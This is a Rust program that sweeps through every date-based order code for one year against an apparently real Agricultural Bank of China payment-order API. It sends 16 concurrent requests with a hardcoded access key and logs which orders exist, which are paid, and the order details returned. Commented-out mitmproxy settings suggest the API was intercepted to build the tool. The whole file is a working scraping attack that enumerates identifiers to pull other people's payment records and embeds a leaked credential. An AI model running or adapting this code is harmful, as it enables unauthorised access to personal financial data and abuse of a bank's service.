use std::{
    fs::{self, OpenOptions},
    sync::Arc,
    thread,
    time::Duration,
};

use anyhow::Result;
use reqwest::{Certificate, Client, Proxy, redirect};
use serde::{Deserialize, Serialize};
use sonic_rs::Object;
use tokio::sync::Semaphore;

struct HttpClient {
    client: Client,
}

#[derive(Serialize, Deserialize, Debug)]
struct QueryResponse {
    code: u16,
    data: Query,
}

#[derive(Serialize, Deserialize, Debug)]
#[serde(untagged)]
enum Query {
    OK(QueryData),
    Error(String),
}

#[derive(Serialize, Deserialize, Debug)]
struct QueryData {
    PayOrderInfo: Option<PayOrderInfo>,
    errcode: String,
    errmsg: String,
}

#[derive(Serialize, Deserialize, Debug)]
struct PayOrderInfo {
    PaperName: String,
}

impl HttpClient {
    fn build() -> Result<Self> {
        // let cert = Certificate::from_pem(&fs::read(
        //     "/Users/terakomari/.mitmproxy/mitmproxy-ca-cert.pem",
        // )?)?;

        let client = reqwest::Client::builder()
            .redirect(redirect::Policy::none())
            .connect_timeout(Duration::from_secs(10))
            .timeout(Duration::from_secs(5))
            // .proxy(Proxy::all("http://127.0.0.1:8080")?)
            // .tls_certs_merge([cert])
            .build()?;

        Ok(Self { client })
    }

    async fn query(&self, bis_code: &str) -> Result<()> {
        let response: QueryResponse = self
            .client
            .post("https://qcloudbj.abchina.com.cn/api/nm/smoh/hqbdmz2/getpayorder")
            .json(&sonic_rs::json!({
                "BisCode":bis_code
            }))
            .header("X-Qc-Accesskey", "i4D2h3etENbCZzKd")
            .send()
            .await?
            .error_for_status()?
            .json()
            .await?;

        if response.code == 502 {
            tracing::info!("订单不存在：{bis_code}");
        } else if response.code == 200 {
            if let Query::OK(data) = response.data {
                if data.errcode == "000000" && data.errmsg == "SUCCESS" {
                    tracing::info!("{bis_code} 获取成功：{:?}", data.PayOrderInfo)
                } else if data.errcode == "000002" && data.errmsg == "已交款,请勿重复获取"
                {
                    tracing::info!("订单已付款：{bis_code}");
                } else {
                    anyhow::bail!("未知错误：{data:?}")
                }
            }
        } else {
            anyhow::bail!("未知错误：{response:?}")
        }

        Ok(())
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    let _guard = login::init_log(&clap_verbosity_flag::Verbosity::new(4, 0), "log", "login4")?;
    let client = Arc::new(HttpClient::build()?);
    let semaphore = Arc::new(Semaphore::new(16));

    // 0124 0111 0000 369
    // 0125 1104 0000 396

    const DAYS_IN_MONTH: [u8; 13] = [0, 31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];

    for m in 1..13 {
        for d in 1..DAYS_IN_MONTH[m] + 1 {
            for seq in 1..400 {
                let bis_code = format!("0124{m:02}{d:02}0000{seq:03}");
                let client = Arc::clone(&client);
                let permit = semaphore.clone().acquire_owned().await.unwrap();

                tokio::spawn(async move {
                    if let Err(error) = client.query(&bis_code).await {
                        tracing::error!("{bis_code} 失败");
                        //tracing::error!("{error}");
                    }

                    drop(permit);
                    anyhow::Ok(())
                });
            }
        }
    }

    Ok(())
}
